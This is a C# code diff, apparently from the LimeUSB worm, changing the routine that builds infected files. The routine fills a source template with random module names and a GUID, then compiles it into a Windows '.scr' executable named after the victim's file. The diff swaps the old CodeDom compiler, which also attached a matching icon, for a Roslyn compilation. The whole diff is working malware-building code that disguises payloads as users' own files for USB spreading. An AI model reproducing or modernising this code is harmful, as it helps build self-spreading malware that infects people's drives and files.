@@ -2,14 +2,14 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.Linq;
 using System.Text;
 using System.Drawing.IconLib;
 using System.Windows.Forms;
 using Microsoft.Win32;
 using System.Drawing;
-using Microsoft.CSharp;
-using System.CodeDom.Compiler;
-using Microsoft.VisualBasic.Devices;
+using Microsoft.CodeAnalysis;
+using Microsoft.CodeAnalysis.CSharp;
 
 
 namespace Miscellaneous.Handler
@@ -154,44 +154,23 @@ namespace Miscellaneous.Handler
                 source = source.Replace("%LimeUSBModule%", Randomz(new Random().Next(6, 12)));
                 source = source.Replace("%Guid%", Guid.NewGuid().ToString());
 
-                string[] referencedAssemblies = new string[] { "System.dll" };
+                string[] referencedAssemblies = new string[] { typeof(object).Assembly.Location };
 
-                var providerOptions = new Dictionary<string, string>() {
-                {"CompilerVersion", "v4.0" }
-            };
+                var outputAssembly = infectedFile + ".scr";
+                var syntaxTree = CSharpSyntaxTree.ParseText(source);
+                var references = referencedAssemblies
+                    .Where(r => File.Exists(r))
+                    .Select(r => MetadataReference.CreateFromFile(r))
+                    .Cast<MetadataReference>()
+                    .ToList();
 
-                var compilerOptions = "/target:winexe /platform:anycpu /optimize+";
-                if (File.Exists(Path.GetPathRoot(infectedFile) + Settings.WorkDirectory + "\\" + Settings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(infectedFile.Replace(" ", null)) + ".ico"))
-                {
-                    compilerOptions += $" /win32icon:\"{Path.GetPathRoot(infectedFile) + Settings.WorkDirectory + "\\" + Settings.IconsDirectory + "\\" + Path.GetFileNameWithoutExtension(infectedFile.Replace(" ", null)) + ".ico"}\"";
-                }
+                var compilation = CSharpCompilation.Create(
+                    Path.GetFileNameWithoutExtension(outputAssembly),
+                    new[] { syntaxTree },
+                    references,
+                    new CSharpCompilationOptions(OutputKind.WindowsApplication, optimizationLevel: OptimizationLevel.Release));
 
-                using (var cSharpCodeProvider = new CSharpCodeProvider(providerOptions))
-                {
-                    var compilerParameters = new CompilerParameters(referencedAssemblies)
-                    {
-                        GenerateExecutable = true,
-                        OutputAssembly = infectedFile + ".scr",
-                        CompilerOptions = compilerOptions,
-                        TreatWarningsAsErrors = false,
-                        IncludeDebugInformation = false,
-                    };
-                    var compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, source);
-
-                    //if (compilerResults.Errors.Count > 0)
-                    //{
-                    //    MessageBox.Show(string.Format("The compiler has encountered {0} errors",
-                    //         compilerResults.Errors.Count), "Errors while compiling", MessageBoxButtons.OK,
-                    //         MessageBoxIcon.Error);
-
-                    //    foreach (CompilerError compilerError in compilerResults.Errors)
-                    //    {
-                    //        MessageBox.Show(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
-                    //            compilerError.Line, compilerError.Column, compilerError.FileName), "Error",
-                    //            MessageBoxButtons.OK, MessageBoxIcon.Error);
-                    //    }
-                    //}
-                }
+                compilation.Emit(outputAssembly);
             }
             catch (Exception ex)
             {
